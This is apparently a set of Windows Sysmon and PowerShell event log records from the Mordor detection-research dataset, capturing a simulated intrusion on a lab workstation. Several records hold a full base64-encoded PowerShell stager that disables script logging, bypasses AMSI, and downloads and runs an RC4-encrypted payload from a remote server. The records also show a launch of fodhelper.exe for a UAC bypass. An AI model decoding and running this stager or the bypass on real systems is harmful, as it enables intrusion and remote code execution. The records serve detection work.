{"Version":3,"Message":"Image loaded:\r\nRuleName: -\r\nUtcTime: 2020-09-04 07:30:13.245\r\nProcessGuid: {3ddc5665-e80d-5f51-2501-000000000500}\r\nProcessId: 1376\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nImageLoaded: C:\\Windows\\System32\\OneCoreUAPCommonProxyStub.dll\r\nFileVersion: 10.0.18362.997 (WinBuild.160101.0800)\r\nDescription: OneCoreUAP Common Proxy Stub\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: OneCoreUAPCommonProxyStub.dll\r\nHashes: SHA1=669FE059ADCE0D861F2A9DCB8FB1F455DD8E95FF,MD5=861C37875DCD501D690394B7D0EF2550,SHA256=B4B003167A56DE22B979B0680656823D332D0EE9055380005A81A598168C2DA2,IMPHASH=1829F1ADD9570A03664654948E98E4E7\r\nSigned: true\r\nSignature: Microsoft Windows\r\nSignatureStatus: Valid","Product":"Microsoft® Windows® Operating System","Domain":"NT AUTHORITY","ImageLoaded":"C:\\Windows\\System32\\OneCoreUAPCommonProxyStub.dll","UserID":"S-1-5-18","Hostname":"WORKSTATION5.theshire.local","EventType":"INFO","SignatureStatus":"Valid","Keywords":-9223372036854775808,"AccountName":"SYSTEM","EventID":7,"FileVersion":"10.0.18362.997 (WinBuild.160101.0800)","ProcessId":"1376","ProcessGuid":"{3ddc5665-e80d-5f51-2501-000000000500}","Description":"OneCoreUAP Common Proxy Stub","Hashes":"SHA1=669FE059ADCE0D861F2A9DCB8FB1F455DD8E95FF,MD5=861C37875DCD501D690394B7D0EF2550,SHA256=B4B003167A56DE22B979B0680656823D332D0EE9055380005A81A598168C2DA2,IMPHASH=1829F1ADD9570A03664654948E98E4E7","Channel":"Microsoft-Windows-Sysmon/Operational","Signature":"Microsoft Windows","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3080,"SourceModuleType":"im_msvistalog","AccountType":"User","Opcode":"Info","SourceName":"Microsoft-Windows-Sysmon","Company":"Microsoft Corporation","ThreadID":4344,"RecordNumber":309688,"SeverityValue":2,"SourceModuleName":"eventlog","Severity":"INFO","OriginalFileName":"OneCoreUAPCommonProxyStub.dll","OpcodeValue":0,"host":"wec.internal.cloudapp.net","port":53971,"@version":"1","Category":"Image loaded (rule: ImageLoad)","EventReceivedTime":"2020-09-04 03:30:13","Task":7,"UtcTime":"2020-09-04 07:30:13.245","EventTime":"2020-09-04 03:30:13","@timestamp":"2020-09-04T07:30:13.842Z","tags":["mordorDataset"],"RuleName":"-","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","Signed":"true"}
{"Version":1,"AccountType":"User","Domain":"THESHIRE","ContextInfo":"        Severity = Informational\r\n        Host Name = Default Host\r\n        Host Version = 5.1.18362.752\r\n        Host ID = e0c721de-e388-4e12-b87b-cd7d6e01790c\r\n        Host Application = C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Win Hidden -enc SQBGACgAJABQAFMAVgBFAFIAUwBpAG8AbgBUAEEAQgBsAEUALgBQAFMAVgBFAFIAUwBJAG8ATgAuAE0AQQBqAE8AcgAgAC0AZwBlACAAMwApAHsAJAA2ADgANgA2AD0AWwBSAGUAZgBdAC4AQQBzAHMAZQBNAEIATABZAC4ARwBFAFQAVAB5AFAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYAaQBFAGAAbABEACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkADYAOAA2ADYAKQB7ACQAMQBmAEUANwA9ACQANgA4ADYANgAuAEcARQBUAFYAYQBsAFUAZQAoACQAbgBVAEwATAApADsASQBmACgAJAAxAEYAZQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAMQBGAGUANwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAxAGYAZQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAVgBhAGwAPQBbAEMATwBsAEwARQBjAFQASQBvAG4AcwAuAEcAZQBuAGUAcgBpAGMALgBEAGkAQwBUAGkAbwBuAEEAcgB5AFsAcwB0AFIAaQBOAGcALABTAFkAcwB0AEUAbQAuAE8AYgBqAGUAQwB0AF0AXQA6ADoAbgBFAHcAKAApADsAJABWAGEATAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AEEAbAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADEARgBFADcAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAGwAfQBFAGwAcwBlAHsAWwBTAGMAcgBpAFAAdABCAEwATwBDAEsAXQAuACIARwBlAFQARgBpAEUAYABsAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBsAFUARQAoACQAbgBVAEwATAAsACgATgBlAHcALQBPAEIASgBlAGMAdAAgAEMAbwBsAEwAZQBjAHQAaQBPAG4AcwAuAEcAZQBuAEUAUgBJAGMALgBIAEEAcwBIAFMARQBUAFsAUwB0AFIASQBuAGcAXQApACkAfQAkAFIARQBGAD0AWwBSAEUARgBdAC4AQQBzAFMARQBtAEIATABZAC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBlAEYALgBHAEUAVABGAEkARQBsAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAHUAZQAoACQATgB1AGwAbAAsACQAdABSAFUAZQApADsAfQA7AFsAUwBZAHMAdABFAG0ALgBOAGUAVAAuAFMARQByAHYASQBjAGUAUABvAEkATgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQBYAFAAZQBjAHQAMQAwADAAQwBvAG4AdABpAE4AVQBFAD0AMAA7ACQARgA5ADQAZQA9AE4ARQB3AC0ATwBCAEoARQBjAHQAIABTAFkAUwB0AEUATQAuAE4AZQB0AC4AVwBFAGIAQwBsAGkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AHQALgBFAE4AYwBvAEQAaQBOAEcAXQA6ADoAVQBOAGkAQwBPAGQARQAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBDAE8AbgBWAGUAcgBUAF0AOgA6AEYAUgBPAE0AQgBhAHMAZQA2ADQAUwB0AFIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbABvAGcAaQBuAC8AcAByAG8AYwBlAHMAcwAuAHAAaABwACcAOwAkAGYAOQA0AEUALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABGADkANABFAC4AUAByAG8AeAB5AD0AWwBTAFkAcwB0AGUAbQAuAE4ARQBUAC4AVwBFAGIAUgBFAFEAdQBlAFMAdABdADoAOgBEAEUARgBhAFUATABUAFcAZQBiAFAAUgBvAFgAWQA7ACQARgA5ADQARQAuAFAAcgBvAFgAWQAuAEMAUgBFAGQAZQBOAHQAaQBhAGwAcwAgAD0AIABbAFMAWQBzAHQAZQBtAC4ATgBlAHQALgBDAFIARQBEAEUAbgBUAEkAQQBsAEMAQQBDAGgARQBdADoAOgBEAGUARgBhAFUATAB0AE4AZQB0AFcATwBSAEsAQwByAGUARABFAE4AVABJAEEATABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAGYAOQA0AGUALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBzAHQAZQBNAC4AVABFAFgAdAAuAEUATgBDAE8ARABpAG4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAdABCAFkAVABlAFMAKAAnAD4AaQBeAEwAfgBmACUAeQBbACgAUgBwADAAbgBkAGoALwBQADwASgBrADMAPQBoAEgAcQBlAHQARQA/ADYALQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwBVAE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAFgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAGYAOQA0AGUALgBIAEUAYQBkAGUAcgBTAC4AQQBkAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAEcAQgBmAFIAYgBIAGMAcABjAHcAdgA9AGwAVwBsAEMAZwBrAHMAeQBMADMAUAB4AEwAcABBAHkARwB4AEYASQBqAFYATABYADQAMABBAD0AIgApADsAJABEAGEAVABBAD0AJABmADkANABFAC4ARABPAFcATgBsAE8AQQBEAEQAYQBUAGEAKAAkAHMARQBSACsAJAB0ACkAOwAkAGkAdgA9ACQARABBAFQAYQBbADAALgAuADMAXQA7ACQAZABBAFQAQQA9ACQAZABhAHQAYQBbADQALgAuACQAZABBAHQAYQAuAGwAZQBOAEcAdABIAF0AOwAtAEoATwBpAE4AWwBDAEgAYQBSAFsAXQBdACgAJgAgACQAUgAgACQARABBAHQAQQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\r\n        Engine Version = 5.1.18362.752\r\n        Runspace ID = 0cdca6a7-e64c-4b73-be25-b18db6018f6b\r\n        Pipeline ID = 1\r\n        Command Name = Join-Path\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 3128\r\n        User = THESHIRE\\pgustavo\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","Opcode":"To be used when operation is just executing a method","UserID":"S-1-5-21-3125456671-949036322-3048627137-1104","SourceName":"Microsoft-Windows-PowerShell","Hostname":"WORKSTATION5.theshire.local","ActivityID":"{245D3B9B-5E92-0001-A62A-D7128A82D601}","EventType":"INFO","ThreadID":7596,"RecordNumber":3596,"SeverityValue":2,"SourceModuleName":"eventlog","Keywords":0,"Severity":"INFO","OpcodeValue":20,"AccountName":"pgustavo","host":"wec.internal.cloudapp.net","EventID":4103,"ERROR_EVT_UNRESOLVED":true,"port":53971,"@version":"1","Category":"Executing Pipeline","EventReceivedTime":"2020-09-04 03:30:13","Task":106,"Payload":"CommandInvocation(Join-Path): \"Join-Path\"\r\nParameterBinding(Join-Path): name=\"Path\"; value=\"C:\\windows\\system32\"\r\nParameterBinding(Join-Path): name=\"ChildPath\"; value=\"fodhelper.exe\"\r\n","EventTime":"2020-09-04 03:30:13","Channel":"Microsoft-Windows-PowerShell/Operational","@timestamp":"2020-09-04T07:30:13.843Z","ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","ExecutionProcessID":1376,"SourceModuleType":"im_msvistalog","tags":["mordorDataset"]}
{"Version":5,"Message":"Process Create:\r\nRuleName: -\r\nUtcTime: 2020-09-04 07:30:13.250\r\nProcessGuid: {3ddc5665-ed05-5f51-ed02-000000000500}\r\nProcessId: 5224\r\nImage: C:\\Windows\\System32\\fodhelper.exe\r\nFileVersion: 10.0.18362.1 (WinBuild.160101.0800)\r\nDescription: Features On Demand Helper\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: FodHelper.EXE\r\nCommandLine: \"C:\\windows\\system32\\fodhelper.exe\" \r\nCurrentDirectory: C:\\windows\\system32\\\r\nUser: THESHIRE\\pgustavo\r\nLogonGuid: {3ddc5665-e7e4-5f51-2d99-0a0000000000}\r\nLogonId: 0xA992D\r\nTerminalSessionId: 2\r\nIntegrityLevel: Medium\r\nHashes: SHA1=98551F5184691B65DCEBA531C4E4975D77CD25A5,MD5=7215C73EC1AAE35B9E4B1F22C811F85C,SHA256=7E80DA8D839DCF05E30317256460ED7A4EE25CAB2750D768569AAAB35E1E8C64,IMPHASH=2BD851C90720C3E5FEE7E3FF3ACFA3D5\r\nParentProcessGuid: {3ddc5665-e80d-5f51-2501-000000000500}\r\nParentProcessId: 1376\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -Win Hidden -enc SQBGACgAJABQAFMAVgBFAFIAUwBpAG8AbgBUAEEAQgBsAEUALgBQAFMAVgBFAFIAUwBJAG8ATgAuAE0AQQBqAE8AcgAgAC0AZwBlACAAMwApAHsAJAA2ADgANgA2AD0AWwBSAGUAZgBdAC4AQQBzAHMAZQBNAEIATABZAC4ARwBFAFQAVAB5AFAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYAaQBFAGAAbABEACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkADYAOAA2ADYAKQB7ACQAMQBmAEUANwA9ACQANgA4ADYANgAuAEcARQBUAFYAYQBsAFUAZQAoACQAbgBVAEwATAApADsASQBmACgAJAAxAEYAZQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAMQBGAGUANwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAxAGYAZQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAVgBhAGwAPQBbAEMATwBsAEwARQBjAFQASQBvAG4AcwAuAEcAZQBuAGUAcgBpAGMALgBEAGkAQwBUAGkAbwBuAEEAcgB5AFsAcwB0AFIAaQBOAGcALABTAFkAcwB0AEUAbQAuAE8AYgBqAGUAQwB0AF0AXQA6ADoAbgBFAHcAKAApADsAJABWAGEATAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AEEAbAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADEARgBFADcAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAGwAfQBFAGwAcwBlAHsAWwBTAGMAcgBpAFAAdABCAEwATwBDAEsAXQAuACIARwBlAFQARgBpAEUAYABsAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBsAFUARQAoACQAbgBVAEwATAAsACgATgBlAHcALQBPAEIASgBlAGMAdAAgAEMAbwBsAEwAZQBjAHQAaQBPAG4AcwAuAEcAZQBuAEUAUgBJAGMALgBIAEEAcwBIAFMARQBUAFsAUwB0AFIASQBuAGcAXQApACkAfQAkAFIARQBGAD0AWwBSAEUARgBdAC4AQQBzAFMARQBtAEIATABZAC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBlAEYALgBHAEUAVABGAEkARQBsAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAHUAZQAoACQATgB1AGwAbAAsACQAdABSAFUAZQApADsAfQA7AFsAUwBZAHMAdABFAG0ALgBOAGUAVAAuAFMARQByAHYASQBjAGUAUABvAEkATgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQBYAFAAZQBjAHQAMQAwADAAQwBvAG4AdABpAE4AVQBFAD0AMAA7ACQARgA5ADQAZQA9AE4ARQB3AC0ATwBCAEoARQBjAHQAIABTAFkAUwB0AEUATQAuAE4AZQB0AC4AVwBFAGIAQwBsAGkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AHQALgBFAE4AYwBvAEQAaQBOAEcAXQA6ADoAVQBOAGkAQwBPAGQARQAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBDAE8AbgBWAGUAcgBUAF0AOgA6AEYAUgBPAE0AQgBhAHMAZQA2ADQAUwB0AFIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbABvAGcAaQBuAC8AcAByAG8AYwBlAHMAcwAuAHAAaABwACcAOwAkAGYAOQA0AEUALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABGADkANABFAC4AUAByAG8AeAB5AD0AWwBTAFkAcwB0AGUAbQAuAE4ARQBUAC4AVwBFAGIAUgBFAFEAdQBlAFMAdABdADoAOgBEAEUARgBhAFUATABUAFcAZQBiAFAAUgBvAFgAWQA7ACQARgA5ADQARQAuAFAAcgBvAFgAWQAuAEMAUgBFAGQAZQBOAHQAaQBhAGwAcwAgAD0AIABbAFMAWQBzAHQAZQBtAC4ATgBlAHQALgBDAFIARQBEAEUAbgBUAEkAQQBsAEMAQQBDAGgARQBdADoAOgBEAGUARgBhAFUATAB0AE4AZQB0AFcATwBSAEsAQwByAGUARABFAE4AVABJAEEATABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAGYAOQA0AGUALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBzAHQAZQBNAC4AVABFAFgAdAAuAEUATgBDAE8ARABpAG4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAdABCAFkAVABlAFMAKAAnAD4AaQBeAEwAfgBmACUAeQBbACgAUgBwADAAbgBkAGoALwBQADwASgBrADMAPQBoAEgAcQBlAHQARQA/ADYALQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwBVAE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAFgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAGYAOQA0AGUALgBIAEUAYQBkAGUAcgBTAC4AQQBkAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAEcAQgBmAFIAYgBIAGMAcABjAHcAdgA9AGwAVwBsAEMAZwBrAHMAeQBMADMAUAB4AEwAcABBAHkARwB4AEYASQBqAFYATABYADQAMABBAD0AIgApADsAJABEAGEAVABBAD0AJABmADkANABFAC4ARABPAFcATgBsAE8AQQBEAEQAYQBUAGEAKAAkAHMARQBSACsAJAB0ACkAOwAkAGkAdgA9ACQARABBAFQAYQBbADAALgAuADMAXQA7ACQAZABBAFQAQQA9ACQAZABhAHQAYQBbADQALgAuACQAZABBAHQAYQAuAGwAZQBOAEcAdABIAF0AOwAtAEoATwBpAE4AWwBDAEgAYQBSAFsAXQBdACgAJgAgACQAUgAgACQARABBAHQAQQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA","Product":"Microsoft® Windows® Operating System","Domain":"NT AUTHORITY","UserID":"S-1-5-18","Hostname":"WORKSTATION5.theshire.local","TerminalSessionId":"2","EventType":"INFO","ParentCommandLine":"\"C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -Win Hidden -enc SQBGACgAJABQAFMAVgBFAFIAUwBpAG8AbgBUAEEAQgBsAEUALgBQAFMAVgBFAFIAUwBJAG8ATgAuAE0AQQBqAE8AcgAgAC0AZwBlACAAMwApAHsAJAA2ADgANgA2AD0AWwBSAGUAZgBdAC4AQQBzAHMAZQBNAEIATABZAC4ARwBFAFQAVAB5AFAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYAaQBFAGAAbABEACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkADYAOAA2ADYAKQB7ACQAMQBmAEUANwA9ACQANgA4ADYANgAuAEcARQBUAFYAYQBsAFUAZQAoACQAbgBVAEwATAApADsASQBmACgAJAAxAEYAZQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAMQBGAGUANwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAxAGYAZQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAVgBhAGwAPQBbAEMATwBsAEwARQBjAFQASQBvAG4AcwAuAEcAZQBuAGUAcgBpAGMALgBEAGkAQwBUAGkAbwBuAEEAcgB5AFsAcwB0AFIAaQBOAGcALABTAFkAcwB0AEUAbQAuAE8AYgBqAGUAQwB0AF0AXQA6ADoAbgBFAHcAKAApADsAJABWAGEATAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AEEAbAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADEARgBFADcAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAGwAfQBFAGwAcwBlAHsAWwBTAGMAcgBpAFAAdABCAEwATwBDAEsAXQAuACIARwBlAFQARgBpAEUAYABsAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBsAFUARQAoACQAbgBVAEwATAAsACgATgBlAHcALQBPAEIASgBlAGMAdAAgAEMAbwBsAEwAZQBjAHQAaQBPAG4AcwAuAEcAZQBuAEUAUgBJAGMALgBIAEEAcwBIAFMARQBUAFsAUwB0AFIASQBuAGcAXQApACkAfQAkAFIARQBGAD0AWwBSAEUARgBdAC4AQQBzAFMARQBtAEIATABZAC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBlAEYALgBHAEUAVABGAEkARQBsAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAHUAZQAoACQATgB1AGwAbAAsACQAdABSAFUAZQApADsAfQA7AFsAUwBZAHMAdABFAG0ALgBOAGUAVAAuAFMARQByAHYASQBjAGUAUABvAEkATgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQBYAFA